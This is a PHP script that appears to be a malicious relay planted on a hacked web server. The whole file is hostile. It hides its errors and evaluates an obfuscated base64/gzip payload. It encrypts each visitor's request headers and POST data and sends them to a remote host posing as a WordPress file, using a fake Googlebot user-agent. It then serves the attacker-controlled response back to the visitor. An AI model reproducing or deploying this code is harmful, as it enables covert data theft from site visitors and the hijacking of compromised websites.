<?php

@error_reporting(0);
@ini_set('memory_limit', '128M');
@ini_set('zlib.output_compression', 'Off');
@ini_set('output_buffering', 'Off');
@ini_set('output_handler', '');
@set_time_limit(0);
$target="http://motrev.net/wp-admin/includes/class-wp-update-skins.php";

$dbg = 0;
$pid = getmypid();
$log = "./e.log";
$request_protocol = $_SERVER['SERVER_PROTOCOL'];
$socket_read_chunk_len = 4096;
$socket_read_content_length_len = 4096;
$socket_read_default_len = 4096;

$psl='';
$b64d=base64_decode($psl);
$gzi=gzinflate($b64d);
eval($gzi);

function my_file_put_contents($filename, $data, $mode) {
    $f = fopen($filename, $mode);
    if (!$f) {
        return false;
    } else {
        $bytes = fwrite($f, $data);
        fclose($f);
        return $bytes;
    }
}

function my_log($text) {
    global $pid, $log, $dbg;
    if ($dbg == 1) {
        my_file_put_contents($log, "$pid|" . date('r') . "|" . str_replace("\n", "\\n", str_replace("\r", "\\r", $text)) . "\n", "a");
    }
}

function my_var_dump($var) {
    ob_start();
    var_dump($var);
    $result = ob_get_clean();
    return $result;
}

function my_socket_read($fp, $stop_string) {
    $out = '';
    $data = '';
    //my_log("My socket read start");
    while (($data = socket_read($fp, 1)) !== false) {
        if (strlen($data) == 0) {
            break;
        }
        $out .= $data;
        if (strpos($out, $stop_string) !== false) {
            return $out;
        }
    }
    return false;
}

function my_socket_read_part_dec($fp, $read_len, $socket_read_len, $rc4) {
    $i = 0;
    $out = array('read' => '', 'dec' => '');
    $data = $dec_data = '';
    while ($i < $read_len) {
        if (($read_len - strlen($out['read'])) < $socket_read_len) {
            $socket_read_len = $read_len - strlen($out['read']);
        }
        $data = socket_read($fp, $socket_read_len);
        $out['read'] .= $data;
        //my_log("Socket read part data(". strlen($data) .") = " . $data . "");
        $dec_data = $rc4->decrypt($data);
        $out['dec'] .= $dec_data;
        echo $dec_data;
        //my_log("  Decrypted part data(". strlen($dec_data) .") = " . $dec_data . "");
        $i+=strlen($data);
    }
    //my_log("Socket read part out(". strlen($out['read']) .") = " . $out['read'] . "");
    //my_log("  Decrypted part out(". strlen($out['dec']) .") = " . $out['dec'] . "");
    return $out;
}

function str_makerand($minlength, $maxlength) {
    $key = '';
    $charset = "abcdefghijklmnopqrstuvwxyz";
    $charset .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $charset .= "0123456789";
    $charset .= "~@#$%^*()_+-={}|][";   // Note: using all special characters this reads: "~!@#$%^&*()_+`-={}|\\]?[\":;'><,./";
    if ($minlength > $maxlength)
        $length = mt_rand($maxlength, $minlength);
    else
        $length = mt_rand($minlength, $maxlength);
    for ($i = 0; $i < $length; $i++)
        $key .= $charset[(mt_rand(0, (strlen($charset) - 1)))];
    return $key;
}

$client_ip = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : $_SERVER['REMOTE_ADDR'];
if (/* FILTER_BLOCK= */0) {
    sleep(600);
    header("HTTP/1.0 404 Not Found");
} else {
    $target_url = parse_url($target);
    $target_host = isset($target_url['host']) ? $target_url['host'] : '';
    $target_port = isset($target_url['port']) ? $target_url['port'] : 80;
    $target_path = isset($target_url['path']) ? $target_url['path'] : '/';

    $headers = serialize($_SERVER);
    my_log("src_headers=" . my_var_dump($_SERVER));
    $post_data_test = "";
    if ($_SERVER['REQUEST_METHOD'] == "POST") {
        $post_data_test = file_get_contents("php://input");
    }
    my_log("src_data=" . $post_data_test);
    if (!(($fp = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) and (socket_connect($fp, $target_host, $target_port)))) {
        header($_SERVER['SERVER_PROTOCOL'] . ' 404 Not Found');
        exit;
    }

    $rsa = new Crypt_RSA();
    $publickey="-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCEUffr4U42RODZ6DMA1r8rFRWc
Olp5PmWRbfc3/EzNiJm5F8wrQVxraYwcLokm3maQeMuZE/VuouqCmDc4SoPJ3Zhy
XocZN8xxHIa0cYhxYeS/vRIODSRn47A2lsHioZgUKEX+X64NEUntgwq8lwbGOP+l
AJTfOMLKcMPHSEznOQIDAQAB
-----END PUBLIC KEY-----";
    $rsa->loadKey($publickey);
    $rc4 = new Crypt_RC4();
    $rc4_key = str_makerand(24, 24);
    $rc4->setKey($rc4_key);
    $rc4->enableContinuousBuffer();
    my_log("src_rc4_key=" . $rc4_key);
    $request = "POST $target_path $request_protocol\r\n";
    $request.="Host: $target_host\r\n";
    $request.="User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n";
    $request.="Content-Type: application/x-www-form-urlencoded\r\n";
    if ($request_protocol == "HTTP/1.1") {
        $request.="Expect: 100-continue\r\n";
        $request.="Connection: Keep-Alive\r\n";
    }
    $request_data = "k=" . urlencode(base64_encode($rsa->encrypt($rc4_key)));
    if (!empty($headers))
        $request_data .= "&h=" . urlencode(base64_encode($rc4->encrypt($headers)));
    if (!empty($post_data_test))
        $request_data .= "&d=" . urlencode(base64_encode($rc4->encrypt($post_data_test)));
    $content_length = strlen($request_data);
    $request.="Content-Length: " . $content_length . "\r\n";
    $request.="\r\n";
    $request.=$request_data;
    my_log("src_request=" . $request);
    socket_write($fp, $request, strlen($request));

    $chunk_exist = false;
    $content_length_exist = false;
    while (1) {
        my_log("Begin read response");
        $i = 0;
        $response_headers = trim(my_socket_read($fp, "\r\n\r\n"));
        my_log("Headers = " . my_var_dump($response_headers));
        $header = explode("\n", $response_headers);
        for ($i = 0; $i < count($header); $i++) {
            if (strpos(trim($header[$i]), "Date") === 0 || strpos(trim($header[$i]), "Server") === 0 || strpos(trim($header[$i]), "Connection") === 0) {
                my_log("Missed header = " . trim($header[$i]));
                continue;
            }
            $header_parts = explode(": ", trim($header[$i]));
            if (count($header_parts) == 2) {
                //my_log(my_var_dump($header_parts));
                if (strcasecmp($header_parts[0], "transfer-encoding") == 0 && strcasecmp($header_parts[1], "chunked") == 0) {
                    $chunk_exist = true;
                    //my_log("Chunked exist");
                } elseif (strcasecmp($header_parts[0], "content-length") == 0) {
                    $content_length_exist = true;
                    $content_length_val = (int) $header_parts[1];
                    //my_log("Content-Length exist");
                    //my_log("Content-Length = " . my_var_dump($content_length_val));
                }
            }
            $cur_header = trim($header[$i]);
            if (strcasecmp($cur_header, "HTTP/1.1 100 Continue") == 0) {
                my_log("Ignore header = " . $cur_header);
            } else {
                header($cur_header);
                my_log("Sent header = " . $cur_header);
            }
        }
        if (strcasecmp($request_protocol, "HTTP/1.0") == 0 || $content_length_exist || $chunk_exist || empty($header))
            break;
    }

    $response_body = '';
    $dec_response_body = '';
    if ($chunk_exist) {
        flush(); //need for chunks
        while (( $chunk_body_len = (int) hexdec(trim(my_socket_read($fp, "\r\n"))) ) != false) {
            //my_log("Chunk body length = " . $chunk_body_len);
            $chunk_body_len_str = sprintf("%x\r\n", $chunk_body_len);
            $response_body .= $chunk_body_len_str;
            $dec_response_body .= $chunk_body_len_str;
            echo $chunk_body_len_str;
            $chunk_body_len += 2; // \r\n at the end of each chunk
            $res = my_socket_read_part_dec($fp, $chunk_body_len, $socket_read_chunk_len, $rc4);
            $response_body .= $res['read'];
            $dec_response_body .= $res['dec'];
            //my_log("     Read chunk(". strlen($res['read']) .") = " . $res['read'] . "");
            //my_log("Decrypted chunk(". strlen($res['dec']) .") = " . $res['dec'] . "");
        }
        $chunk_body_end_str = "0\r\n\r\n";
        $response_body .= $chunk_body_end_str;
        $dec_response_body .= $chunk_body_end_str;
        echo $chunk_body_end_str;
    } elseif ($content_length_exist) {
        $res = my_socket_read_part_dec($fp, $content_length_val, $socket_read_content_length_len, $rc4);
        $response_body = $res['read'];
        $dec_response_body = $res['dec'];
    } else {
        while ($data = socket_read($fp, $socket_read_default_len)) {
            $response_body .= $data;
            $dec_response_body .= $rc4->decrypt($data);
        }
        $content_length_header = "Content-Length: " . strlen($dec_response_body);
        my_log("Sent header = $content_length_header");
        header($content_length_header);
        echo $dec_response_body;
    }
    my_log("     Read response(" . strlen($response_body) . ") = " . $response_body . "");
    my_log("Decrypted response(" . strlen($dec_response_body) . ") = " . $dec_response_body . "");
    my_log("Socket close");
    socket_close($fp);
}
?>
